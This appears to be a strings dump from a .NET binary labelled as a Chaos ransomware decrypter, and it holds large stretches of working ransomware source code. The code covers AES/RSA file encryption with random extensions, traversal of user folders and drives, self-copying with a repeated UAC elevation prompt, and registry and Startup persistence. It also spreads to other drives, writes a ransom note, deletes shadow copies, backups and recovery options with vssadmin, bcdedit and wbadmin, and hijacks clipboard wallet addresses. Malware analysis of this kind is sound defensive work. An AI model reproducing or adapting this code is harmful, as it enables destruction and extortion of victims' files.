Metadata Signature: 0x6fe8 0x10001424a5342 12
.NET Version: v4.0.30319
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: 25ec
Stream name: #~ 4
DirectoryAddress: 2658 Size: 24f8
Stream name: #Strings 12
DirectoryAddress: 4b50 Size: 1628
Stream name: #US 4
DirectoryAddress: 6178 Size: 10
Stream name: #GUID 8
DirectoryAddress: 6188 Size: 850
Stream name: #Blob 8
[Strings]
nth  paddr      vaddr      len  size section type    string
1154 0x0002e664 0x00430464 1936 1937 .text   ascii   \n\r\n                    AES.Mode = System.Security.Cryptography.CipherMode.CBC;\r\n\r\n                    using (var cs = new System.Security.Cryptography.CryptoStream(ms, AES.CreateEncryptor(), System.Security.Cryptography.CryptoStreamMode.Write))\r\n                    {\r\n                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);\r\n                        cs.Close();\r\n                    }\r\n                    encryptedBytes = ms.ToArray();\r\n                }\r\n            }\r\n\r\n            return encryptedBytes;\r\n        }\r\n\r\n        public static void EncryptFile(string file)\r\n        {\r\n            byte[] bytesToBeEncrypted = System.IO.File.ReadAllBytes(file);\r\n            string password = CreatePassword(20);\r\n            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);\r\n            //passwordBytes = System.Security.Cryptography.SHA256.Create().ComputeHash(passwordBytes);\r\n            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);\r\n            System.IO.File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(password, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(bytesEncrypted));\r\n            System.IO.File.Move(file, file + "." + RandomStringForExtension(4));\r\n        }\r\n\r\n\r\n        public static string RSAEncrypt(string textToEncrypt, string publicKeyString)\r\n        {\r\n            var bytesToEncrypt = System.Text.Encoding.UTF8.GetBytes(textToEncrypt);\r\n\r\n            using (var rsa = new System.Security.Cryptography.RSACryptoServiceProvider(1024))\r\n            {\r\n                try\r\n                {\r\n                    rsa.FromXmlString(publicKeyString.ToString());\r\n                    var encryptedData = rsa.Encrypt(bytesToEncrypt, true);\r\n                    var base64Encrypted = Convert.ToBase64String(encryptedData);\r\n                    return base64Encrypted;\r\n                }\r\n                finally\r\n                {
1155 0x0002edf5 0x00430bf5 1929 1929 .text   ascii   \n                    rsa.PersistKeyInCsp = false;\r\n                }\r\n            }\r\n        }\r\n\r\n        private static void lookForDirectories()\r\n        {\r\n            foreach (var item in System.IO.DriveInfo.GetDrives())\r\n            {\r\n\r\n                if (item.ToString() != "C:\\")\r\n                {\r\n                    encryptDirectory(item.ToString());\r\n                }\r\n            }\r\n            string startPath_1 = userDir + userName + "\\Desktop";\r\n            string startPath_2 = userDir + userName + "\\Links";\r\n            string startPath_3 = userDir + userName + "\\Contacts";\r\n            string startPath_4 = userDir + userName + "\\Desktop";\r\n            string startPath_5 = userDir + userName + "\\Documents";\r\n            string startPath_6 = userDir + userName + "\\Downloads";\r\n            string startPath_7 = userDir + userName + "\\Pictures";\r\n            string startPath_8 = userDir + userName + "\\Music";\r\n            string startPath_9 = userDir + userName + "\\OneDrive";\r\n            string startPath_10 = userDir + userName + "\\Saved Games";\r\n            string startPath_11 = userDir + userName + "\\Favorites";\r\n            string startPath_12 = userDir + userName + "\\Searches";\r\n            string startPath_13 = userDir + userName + "\\Videos";\r\n            encryptDirectory(startPath_1);\r\n            encryptDirectory(startPath_2);\r\n            encryptDirectory(startPath_3);\r\n            encryptDirectory(startPath_4);\r\n            encryptDirectory(startPath_5);\r\n            encryptDirectory(startPath_6);\r\n            encryptDirectory(startPath_7);\r\n            encryptDirectory(startPath_8);\r\n            encryptDirectory(startPath_9);\r\n            encryptDirectory(startPath_10);\r\n            encryptDirectory(startPath_11);\r\n            encryptDirectory(startPath_12);\r\n            encryptDirectory(startPath_13);\r\n        }\r\n\r\n        private static void copyRoaming(str
1156 0x0002f57e 0x0043137e 1968 1968 .text   ascii   ing processName)\r\n        {\r\n            string payloadFutureName = processName;\r\n            string exeName = System.AppDomain.CurrentDomain.FriendlyName;\r\n            string exepath = System.Reflection.Assembly.GetExecutingAssembly().Location;\r\n            string startuppath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + exeName;\r\n            string tempFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\";\r\n            string executeAs = tempFolder + payloadFutureName;\r\n            //Console.WriteLine(exepath);\r\n            //Console.WriteLine(startuppath);\r\n            if (exeName != payloadFutureName || exepath != executeAs)\r\n            {\r\n                if (!System.IO.File.Exists(executeAs))\r\n                {\r\n                    System.IO.File.Copy(exeName, executeAs);\r\n                    System.Diagnostics.ProcessStartInfo processStartInfo = new System.Diagnostics.ProcessStartInfo(executeAs);\r\n                    processStartInfo.WorkingDirectory = tempFolder;\r\n                    System.Diagnostics.Process process = new System.Diagnostics.Process();\r\n\r\n                    process.StartInfo = processStartInfo;\r\n                    if (process.Start())\r\n                    {\r\n                        System.Environment.Exit(1);\r\n                    }\r\n                }\r\n                else\r\n                {\r\n                    try\r\n                    {\r\n                        System.IO.File.Delete(executeAs);\r\n                        System.Threading.Thread.Sleep(200);\r\n                        System.IO.File.Copy(exeName, executeAs);\r\n\r\n                    }\r\n                    catch { }\r\n                    System.Diagnostics.ProcessStartInfo processStartInfo = new System.Diagnostics.ProcessStartInfo(executeAs);\r\n                    processStartInfo.WorkingDirectory = tempFolder;\r\n                    System.Diagnostics.Process process = new System.Diagnostics.Pro
1157 0x0002fd2e 0x00431b2e 1958 1958 .text   ascii   cess();\r\n                    process.StartInfo = processStartInfo;\r\n                    if (process.Start())\r\n                    {\r\n                        System.Environment.Exit(1);\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        private static void copyResistForAdmin(string processName)\r\n        {\r\n            string payloadFutureName = processName;\r\n            string exeName = System.AppDomain.CurrentDomain.FriendlyName;\r\n            string exepath = System.Reflection.Assembly.GetExecutingAssembly().Location;\r\n            string startuppath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + exeName;\r\n            string tempFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\";\r\n            string executeAs = tempFolder + payloadFutureName;\r\n            const int ERROR_CANCELLED = 1223;\r\n            var startInfo = new System.Diagnostics.ProcessStartInfo(executeAs)\r\n            {\r\n                UseShellExecute = true,\r\n                Verb = "runas",\r\n                WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal,\r\n                WorkingDirectory = tempFolder\r\n            };\r\n            System.Diagnostics.Process process = new System.Diagnostics.Process();\r\n            process.StartInfo = startInfo;\r\n            if (exeName != payloadFutureName || exepath != executeAs)\r\n            {\r\n                if (!System.IO.File.Exists(executeAs))\r\n                {\r\n                    System.IO.File.Copy(exeName, executeAs);\r\n                    try\r\n                    {\r\n                        System.Diagnostics.Process.Start(startInfo);\r\n                        System.Environment.Exit(1);\r\n                    }\r\n                    catch (System.ComponentModel.Win32Exception ex)\r\n                    {\r\n                        if (ex.NativeErrorCode == ERROR_CANCELLED)\r\n                        {\r\n                            co
1158 0x000304d4 0x004322d4 1938 1939 .text   ascii   pyResistForAdmin(processName);\r\n\r\n                        }\r\n                    }\r\n                }\r\n                else\r\n                {\r\n                    try\r\n                    {\r\n                        System.IO.File.Delete(executeAs);\r\n                        System.Threading.Thread.Sleep(200);\r\n                        System.IO.File.Copy(exeName, executeAs);\r\n                    }\r\n                    catch { }\r\n                    try\r\n                    {\r\n                        System.Diagnostics.Process.Start(startInfo);\r\n                        System.Environment.Exit(1);\r\n                    }\r\n                    catch (System.ComponentModel.Win32Exception ex)\r\n                    {\r\n                        if (ex.NativeErrorCode == ERROR_CANCELLED)\r\n                        {\r\n                            copyResistForAdmin(processName);\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        private static void addLinkToStartup()\r\n        {\r\n            string startUpFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);\r\n            string linkName = System.Diagnostics.Process.GetCurrentProcess().ProcessName;\r\n            using (System.IO.StreamWriter writer = new System.IO.StreamWriter(startUpFolder + "\\" + linkName + ".url"))\r\n            {\r\n                string app = System.Reflection.Assembly.GetExecutingAssembly().Location;\r\n                writer.WriteLine("[InternetShortcut]");\r\n                writer.WriteLine("URL=file:///" + app);\r\n                writer.WriteLine("IconIndex=0");\r\n                string icon = app.Replace('\\', '/');\r\n                writer.WriteLine("IconFile=" + icon);\r\n            }\r\n        }\r\n\r\n        private static void addAndOpenNote()\r\n        {\r\n            string tempFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + droppedMessageTextbox;
1159 0x00030c67 0x00432a67 1925 1925 .text   ascii   \n            //string startUpDirectory = userDir + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\read_it.txt";\r\n            try\r\n            {\r\n                System.IO.File.WriteAllLines(tempFolder, messages);\r\n                System.Threading.Thread.Sleep(500);\r\n                System.Diagnostics.Process.Start(tempFolder);\r\n            }\r\n            catch { }\r\n        }\r\n\r\n        private static void registryStartup()\r\n        {\r\n            try\r\n            {\r\n                Microsoft.Win32.RegistryKey key1 = Microsoft.Win32.Registry.CurrentUser.OpenSubKey\r\n                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);            //REGISTRY KEY FOR CURRENT EXE LOCATION\r\n                key1.SetValue("Microsoft Store", System.Reflection.Assembly.GetExecutingAssembly().Location);\r\n            }\r\n            catch { }\r\n\r\n        }\r\n\r\n        private static void spreadIt(string spreadName)\r\n        {\r\n            foreach (var item in System.IO.DriveInfo.GetDrives())\r\n            {\r\n                if (item.ToString() != "C:\\")\r\n                {\r\n                    if (!System.IO.File.Exists(item.ToString() + spreadName))\r\n                    {\r\n                        // System.Threading.Thread.Sleep(500);\r\n                        try\r\n                        {\r\n                            System.IO.File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, item.ToString() + spreadName);\r\n                        }\r\n                        catch { }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        private static void runCommand(string commands)\r\n        {\r\n\r\n            System.Diagnostics.Process process = new System.Diagnostics.Process();\r\n            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\r\n            //startInfo.WindowStyle = System.Diagnostics
1160 0x000313ec 0x004331ec 1929 1930 .text   ascii   .ProcessWindowStyle.Hidden;\r\n            startInfo.FileName = "cmd.exe";\r\n\r\n            startInfo.Arguments = "/C " + commands;\r\n            //startInfo.Arguments = "/C ";\r\n            //startInfo.Arguments = "/C ping google.com";\r\n            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\r\n            process.StartInfo = startInfo;\r\n            process.Start();\r\n            process.WaitForExit();\r\n        }\r\n        private static void deleteShadowCopies()\r\n        {\r\n            //System.Windows.Forms.MessageBox.Show("deleteShadowCopies");\r\n            runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");\r\n        }\r\n        private static void disableRecoveryMode()\r\n        {\r\n            //System.Windows.Forms.MessageBox.Show("disableRecoveryMode");\r\n            runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");\r\n        }\r\n        private static void deleteBackupCatalog()\r\n        {\r\n            //System.Windows.Forms.MessageBox.Show("deleteBackupCatalog");\r\n            runCommand("wbadmin delete catalog -quiet");\r\n        }\r\n\r\n    }\r\n\r\n\r\n    public sealed class driveNotification\r\n    {\r\n        public class NotificationForm : Form\r\n        {\r\n\r\n            private static string currentClipboard = GetText();\r\n            public NotificationForm()\r\n            {\r\n                Program.NativeMethods.SetParent(Handle, Program.NativeMethods.intpreclp);\r\n                Program.NativeMethods.AddClipboardFormatListener(Handle);\r\n            }\r\n\r\n            private bool RegexResult(Regex pattern)\r\n            {\r\n                if (pattern.Match(currentClipboard).Success) return true;\r\n                else\r\n                    return false;\r\n            }\r\n\r\n            protected override void WndProc(ref Message m)\r\n            {\r\n                if (m.Msg == Program.NativeMethods.clp)
1161 0x00031b76 0x00433976 1779 1780 .text   ascii   \n                {\r\n                    currentClipboard = GetText();\r\n\r\n                    if (RegexResult(Program.appMutexRegex) && !currentClipboard.Contains(Program.appMutex))\r\n                    {\r\n                        string result = Program.appMutexRegex.Replace(currentClipboard, Program.appMutex);\r\n                        SetText(result);\r\n                    }\r\n\r\n                }\r\n                base.WndProc(ref m);\r\n            }\r\n            protected override CreateParams CreateParams\r\n            {\r\n                get\r\n                {\r\n                    var cp = base.CreateParams;\r\n                    cp.ExStyle |= 0x80;\r\n                    return cp;\r\n                }\r\n            }\r\n\r\n            public static string GetText()\r\n            {\r\n                string ReturnValue = string.Empty;\r\n                System.Threading.Thread STAThread = new System.Threading.Thread(\r\n                    delegate()\r\n                    {\r\n                        ReturnValue = System.Windows.Forms.Clipboard.GetText();\r\n                    });\r\n                STAThread.SetApartmentState(System.Threading.ApartmentState.STA);\r\n                STAThread.Start();\r\n                STAThread.Join();\r\n\r\n                return ReturnValue;\r\n            }\r\n\r\n            public static void SetText(string txt)\r\n            {\r\n                System.Threading.Thread STAThread = new System.Threading.Thread(\r\n                    delegate()\r\n                    {\r\n                        System.Windows.Forms.Clipboard.SetText(txt);\r\n                    });\r\n                STAThread.SetApartmentState(System.Threading.ApartmentState.STA);\r\n                STAThread.Start();\r\n                STAThread.Join();\r\n            }\r\n        }\r\n\r\n    }\r\n}\r\n 
1162 0x000322ba 0x004340ba 44   45   .text   ascii   !This program cannot be run in DOS mode.\r\r\n$
1163 0x000323e5 0x004341e5 5    6    .text   ascii   .text
1164 0x0003240c 0x0043420c 6    7    .text   ascii   `.rsrc
1165 0x00032434 0x00434234 7    8    .text   ascii   @.reloc
1166 0x000324ef 0x004342ef 4    5    .text   ascii   \n\v\a(
1167 0x00032626 0x00434426 4    5    .text   ascii   \n\bo!
1168 0x000326f2 0x004344f2 5    6    .text   ascii   \n\n*\e0
1169 0x000329ab 0x004347ab 4    5    .text   ascii   \a\b\e0
1170 0x000329cc 0x004347cc 4    5    .text   ascii   \n\vs1
1171 0x00032a36 0x00434836 4    5    .text   ascii   \b\to<
1172 0x00032a84 0x00434884 6    7    .text   ascii   \a-\a\to@
1173 0x00032a9a 0x0043489a 6    7    .text   ascii   \a-\a\bo@
1174 0x00032b07 0x00434907 5    6    .text   ascii   \n\v\a(C
1175 0x00032c44 0x00434a44 4    5    .text   ascii   \n\f\a\b
1176 0x00032c4d 0x00434a4d 4    5    .text   ascii   \n\r(P
1177 0x00032c53 0x00434a53 4    5    .text   ascii   \n\toT
1178 0x00032c7a 0x00434a7a 5    6    .text   ascii   -\a\ao@
1179 0x00032f0f 0x00434d0f 4    5    .text   ascii   @r!\a
1180 0x00032f18 0x00434d18 4    5    .text   ascii   Ar-\a
1181 0x00032f21 0x00434d21 4    5    .text   ascii   Br7\a
1182 0x00032f2a 0x00434d2a 4    5    .text   ascii   CrA\a
1183 0x00032f33 0x00434d33 4    5    .text   ascii   DrK\a
1184 0x00032f3c 0x00434d3c 4    5    .text   ascii   ErS\a
1185 0x00032f45 0x00434d45 4    5    .text   ascii   Fr]\a
1186 0x00032f4e 0x00434d4e 4    5    .text   ascii   Grg\a
1187 0x00032f57 0x00434d57 4    5    .text   ascii   Hrq\a
1188 0x00032f60 0x00434d60 4    5    .text   ascii   Ir{\a
1189 0x00032fd5 0x00434dd5 4    5    .text   ascii   Vr\r\b
1190 0x00032fe7 0x00434de7 4    5    .text   ascii   Xr'\b
1191 0x00032ff0 0x00434df0 4    5    .text   ascii   Yr/\b
1192 0x00032ff9 0x00434df9 4    5    .text   ascii   Zr7\b
1193 0x00033002 0x00434e02 4    5    .text   ascii   [rA\b
1194 0x0003300b 0x00434e0b 4    5    .text   ascii   \rM\b
1195 0x00033014 0x00434e14 4    5    .text   ascii   ]rY\b
1196 0x0003301d 0x00434e1d 4    5    .text   ascii   ^ra\b
1197 0x00033026 0x00434e26 4    5    .text   ascii   _rk\b
1198 0x0003302f 0x00434e2f 4    5    .text   ascii   `rw\b
1199 0x000330ad 0x00434ead 4    5    .text   ascii   nr\a\t
1200 0x000330c8 0x00434ec8 4    5    .text   ascii   qr-\t
1201 0x000330d1 0x00434ed1 4    5    .text   ascii   rr;\t
1202 0x000330da 0x00434eda 4    5    .text   ascii   srE\t
1203 0x000330e3 0x00434ee3 4    5    .text   ascii   trQ\t
1204 0x000330ec 0x00434eec 4    5    .text   ascii   ur[\t
1205 0x000330f5 0x00434ef5 4    5    .text   ascii   vre\t
1206 0x000330fe 0x00434efe 4    5    .text   ascii   wrm\t
1207 0x00033107 0x00434f07 4    5    .text   ascii   xr}\t
1208 0x00033619 0x00435419 4    5    .text   ascii   BSJB
1209 0x00033629 0x00435429 10   11   .text   ascii   v4.0.30319
1210 0x0003364d 0x0043544d 8    9    .text   ascii   #Strings
1211 0x0003366d 0x0043546d 5    6    .text   ascii   #GUID
1212 0x0003367d 0x0043547d 5    6    .text   ascii   #Blob
1213 0x00033c1e 0x00435a1e 8    9    .text   ascii   <Module>
1214 0x00033c27 0x00435a27 30   31   .text   ascii   Chaos ransomware decrypter.exe
1215 0x00033c46 0x00435a46 7    8    .text   ascii   Program
1216 0x00033c4e 0x00435a4e 20   21   .text   ascii   ConsoleApplication15
1217 0x00033c63 0x00435a63 8    9    .text   ascii   mscorlib
1218 0x00033c6c 0x00435a6c 6    7    .text   ascii   System
1219 0x00033c73 0x00435a73 6    7    .text   ascii   Object
1220 0x00033c7a 0x00435a7a 8    9    .text   ascii   userName
1221 0x00033c83 0x00435a83 7    8    .text   ascii   userDir
1222 0x00033c8b 0x00435a8b 16   17   .text   ascii   privateKeyString
1223 0x00033c9c 0x00435a9c 14   15   .text   ascii   decryptedFiles
1224 0x00033cab 0x00435aab 15   16   .text   ascii   validExtensions
1225 0x00033cbb 0x00435abb 4    5    .text   ascii   Main
1226 0x00033cc0 0x00435ac0 10   11   .text   ascii   privateKey
1227 0x00033ccb 0x00435acb 16   17   .text   ascii   decryptDirectory
1228 0x00033cdc 0x00435adc 18   19   .text   ascii   lookForDirectories
1229 0x00033cef 0x00435aef 11   12   .text   ascii   AES_Decrypt
1230 0x00033cfb 0x00435afb 11   12   .text   ascii   DecryptFile
1231 0x00033d07 0x00435b07 7    8    .text   ascii   Decrypt
1232 0x00033d0f 0x00435b0f 5    6    .text   ascii   .ctor
1233 0x00033d15 0x00435b15 4    5    .text   ascii   args
1234 0x00033d1a 0x00435b1a 8    9    .text   ascii   location
1235 0x00033d23 0x00435b23 18   19   .text   ascii   bytesToBeDecrypted
1236 0x00033d36 0x00435b36 13   14   .text   ascii   passwordBytes
1237 0x00033d44 0x00435b44 4    5    .text   ascii   file
1238 0x00033d49 0x00435b49 13   14   .text   ascii   textToDecrypt
1239 0x00033d57 0x00435b57 25   26   .text   ascii   System.Runtime.Versioning
1240 0x00033d71 0x00435b71 24   25   .text   ascii   TargetFrameworkAttribute
1241 0x00033d8a 0x00435b8a 17   18   .text   ascii   System.Reflection
1242 0x00033d9c 0x00435b9c 22   23   .text   ascii   AssemblyTitleAttribute
1243 0x00033db3 0x00435bb3 28   29   .text   ascii   AssemblyDescriptionAttribute
1244 0x00033dd0 0x00435bd0 30   31   .text   ascii   AssemblyConfigurationAttribute
1245 0x00033def 0x00435bef 24   25   .text   ascii   AssemblyCompanyAttribute
1246 0x00033e08 0x00435c08 24   25   .text   ascii   AssemblyProductAttribute
1247 0x00033e21 0x00435c21 26   27   .text   ascii   AssemblyCopyrightAttribute
1248 0x00033e3c 0x00435c3c 26   27   .text   ascii   AssemblyTrademarkAttribute
1249 0x00033e57 0x00435c57 24   25   .text   ascii   AssemblyCultureAttribute
1250 0x00033e70 0x00435c70 30   31   .text   ascii   System.Runtime.InteropServices
1251 0x00033e8f 0x00435c8f 19   20   .text   ascii   ComVisibleAttribute
1252 0x00033ea3 0x00435ca3 13   14   .text   ascii   GuidAttribute
1253 0x00033eb1 0x00435cb1 24   25   .text   ascii   AssemblyVersionAttribute
1254 0x00033eca 0x00435cca 28   29   .text   ascii   AssemblyFileVersionAttribute
1255 0x00033ee7 0x00435ce7 18   19   .text   ascii   System.Diagnostics
1256 0x00033efa 0x00435cfa 19   20   .text   ascii   DebuggableAttribute
1257 0x00033f0e 0x00435d0e 14   15   .text   ascii   DebuggingModes
1258 0x00033f1d 0x00435d1d 31   32   .text   ascii   System.Runtime.CompilerServices
1259 0x00033f3d 0x00435d3d 31   32   .text   ascii   CompilationRelaxationsAttribute
1260 0x00033f5d 0x00435d5d 29   30   .text   ascii   RuntimeCompatibilityAttribute
1261 0x00033f7b 0x00435d7b 26   27   .text   ascii   Chaos ransomware decrypter
1262 0x00033f96 0x00435d96 7    8    .text   ascii   Console
1263 0x00033f9e 0x00435d9e 9    10   .text   ascii   set_Title
1264 0x00033fa8 0x00435da8 8    9    .text   ascii   Assembly
1265 0x00033fb1 0x00435db1 16   17   .text   ascii   GetEntryAssembly
1266 0x00033fc2 0x00435dc2 12   13   .text   ascii   get_Location
1267 0x00033fcf 0x00435dcf 9    10   .text   ascii   System.IO
1268 0x00033fd9 0x00435dd9 4    5    .text   ascii   Path
1269 0x00033fde 0x00435dde 16   17   .text   ascii   GetDirectoryName
1270 0x00033fef 0x00435def 6    7    .text   ascii   String
1271 0x00033ff6 0x00435df6 6    7    .text   ascii   Concat
1272 0x00033ffd 0x00435dfd 4    5    .text   ascii   File
1273 0x00034002 0x00435e02 6    7    .text   ascii   Exists
1274 0x00034009 0x00435e09 11   12   .text   ascii   ReadAllText
1275 0x00034015 0x00435e15 9    10   .text   ascii   WriteLine
1276 0x0003401f 0x00435e1f 14   15   .text   ascii   ConsoleKeyInfo
1277 0x0003402e 0x00435e2e 7    8    .text   ascii   ReadKey
1278 0x00034036 0x00435e36 16   17   .text   ascii   System.Threading
1279 0x00034047 0x00435e47 6    7    .text   ascii   Thread
1280 0x0003404e 0x00435e4e 5    6    .text   ascii   Sleep
1281 0x00034054 0x00435e54 7    8    .text   ascii   Convert
1282 0x0003405c 0x00435e5c 8    9    .text   ascii   ToString
1283 0x00034065 0x00435e65 11   12   .text   ascii   Environment
1284 0x00034071 0x00435e71 13   14   .text   ascii   SpecialFolder
1285 0x0003407f 0x00435e7f 13   14   .text   ascii   GetFolderPath
1286 0x0003408d 0x00435e8d 7    8    .text   ascii   Process
1287 0x00034095 0x00435e95 12   13   .text   ascii   GetProcesses
1288 0x000340a2 0x00435ea2 13   14   .text   ascii   ProcessModule
1289 0x000340b0 0x00435eb0 14   15   .text   ascii   get_MainModule
1290 0x000340bf 0x00435ebf 12   13   .text   ascii   get_FileName
1291 0x000340cc 0x00435ecc 8    9    .text   ascii   Contains
1292 0x000340d5 0x00435ed5 4    5    .text   ascii   Kill
1293 0x000340da 0x00435eda 9    10   .text   ascii   Directory
1294 0x000340e4 0x00435ee4 8    9    .text   ascii   GetFiles
1295 0x000340ed 0x00435eed 6    7    .text   ascii   Delete
1296 0x000340f4 0x00435ef4 11   12   .text   ascii   System.Text
1297 0x00034100 0x00435f00 13   14   .text   ascii   StringBuilder
1298 0x0003410e 0x00435f0e 12   13   .text   ascii   GetExtension
1299 0x0003411b 0x00435f1b 11   12   .text   ascii   GetFileName
1300 0x00034127 0x00435f27 8    9    .text   ascii   FileInfo
1301 0x00034130 0x00435f30 14   15   .text   ascii   FileSystemInfo
1302 0x0003413f 0x00435f3f 14   15   .text   ascii   FileAttributes
1303 0x0003414e 0x00435f4e 14   15   .text   ascii   set_Attributes
1304 0x0003415d 0x00435f5d 10   11   .text   ascii   get_Length
1305 0x00034168 0x00435f68 14   15   .text   ascii   GetDirectories
1306 0x00034177 0x00435f77 9    10   .text   ascii   Exception
1307 0x00034181 0x00435f81 9    10   .text   ascii   DriveInfo
1308 0x0003418b 0x00435f8b 9    10   .text   ascii   GetDrives
1309 0x00034195 0x00435f95 13   14   .text   ascii   op_Inequality
1310 0x000341a3 0x00435fa3 4    5    .text   ascii   Byte
1311 0x000341a8 0x00435fa8 68   69   .text   ascii   <PrivateImplementationDetails>{E135A7E8-EF61-4370-8C79-28295E38EEAA}
1312 0x000341ed 0x00435fed 26   27   .text   ascii   CompilerGeneratedAttribute
1313 0x00034208 0x00436008 19   20   .text   ascii   $$method0x6000005-1
1314 0x0003421c 0x0043601c 14   15   .text   ascii   RuntimeHelpers
1315 0x0003422b 0x0043602b 5    6    .text   ascii   Array
1316 0x00034231 0x00436031 18   19   .text   ascii   RuntimeFieldHandle
1317 0x00034244 0x00436044 15   16   .text   ascii   InitializeArray
1318 0x00034254 0x00436054 12   13   .text   ascii   MemoryStream
1319 0x00034261 0x00436061 28   29   .text   ascii   System.Security.Cryptography
1320 0x0003427e 0x0043607e 15   16   .text   ascii   RijndaelManaged
1321 0x0003428e 0x0043608e 18   19   .text   ascii   SymmetricAlgorithm
1322 0x000342a1 0x004360a1 11   12   .text   ascii   set_KeySize
1323 0x000342ad 0x004360ad 13   14   .text   ascii   set_BlockSize
1324 0x000342bb 0x004360bb 18   19   .text   ascii   Rfc2898DeriveBytes
1325 0x000342ce 0x004360ce 11   12   .text   ascii   get_KeySize
1326 0x000342da 0x004360da 11   12   .text   ascii   DeriveBytes
1327 0x000342e6 0x004360e6 8    9    .text   ascii   GetBytes
1328 0x000342ef 0x004360ef 7    8    .text   ascii   set_Key
1329 0x000342f7 0x004360f7 13   14   .text   ascii   get_BlockSize
1330 0x00034305 0x00436105 6    7    .text   ascii   set_IV
1331 0x0003430c 0x0043610c 10   11   .text   ascii   CipherMode
1332 0x00034317 0x00436117 8    9    .text   ascii   set_Mode
1333 0x00034320 0x00436120 16   17   .text   ascii   ICryptoTransform
1334 0x00034331 0x00436131 15   16   .text   ascii   CreateDecryptor
1335 0x00034341 0x00436141 12   13   .text   ascii   CryptoStream
1336 0x0003434e 0x0043614e 6    7    .text   ascii   Stream
1337 0x00034355 0x00436155 16   17   .text   ascii   CryptoStreamMode
1338 0x00034366 0x00436166 5    6    .text   ascii   Write
1339 0x0003436c 0x0043616c 5    6    .text   ascii   Close
1340 0x00034372 0x00436172 11   12   .text   ascii   IDisposable
1341 0x0003437e 0x0043617e 7    8    .text   ascii   Dispose
1342 0x00034386 0x00436186 7    8    .text   ascii   ToArray
1343 0x0003438e 0x0043618e 4    5    .text   ascii   Char
1344 0x00034393 0x00436193 5    6    .text   ascii   Split
1345 0x00034399 0x00436199 7    8    .text   ascii   Reverse
1346 0x000343a1 0x004361a1 11   12   .text   ascii   System.Core
1347 0x000343ad 0x004361ad 11   12   .text   ascii   System.Linq
1348 0x000343b9 0x004361b9 10   11   .text   ascii   Enumerable
1349 0x000343c4 0x004361c4 26   27   .text   ascii   System.Collections.Generic
1350 0x000343df 0x004361df 13   14   .text   ascii   IEnumerable`1
1351 0x000343ed 0x004361ed 30   31   .text   ascii   System.Text.RegularExpressions
1352 0x0003440c 0x0043620c 5    6    .text   ascii   Regex
1353 0x00034412 0x00436212 5    6    .text   ascii   Match
1354 0x00034418 0x00436218 5    6    .text   ascii   Group
1355 0x0003441e 0x0043621e 11   12   .text   ascii   get_Success
1356 0x0003442a 0x0043622a 7    8    .text   ascii   Capture
1357 0x00034432 0x00436232 9    10   .text   ascii   get_Value
1358 0x0003443c 0x0043623c 7    8    .text   ascii   Replace
1359 0x00034444 0x00436244 5    6    .text   ascii   Empty
1360 0x0003444a 0x0043624a 16   17   .text   ascii   FromBase64String
1361 0x0003445b 0x0043625b 8    9    .text   ascii   Encoding
1362 0x00034464 0x00436264 9    10   .text   ascii   get_ASCII
1363 0x0003446e 0x0043626e 13   14   .text   ascii   WriteAllBytes
1364 0x0003447c 0x0043627c 4    5    .text   ascii   Move
1365 0x00034481 0x00436281 8    9    .text   ascii   get_UTF8
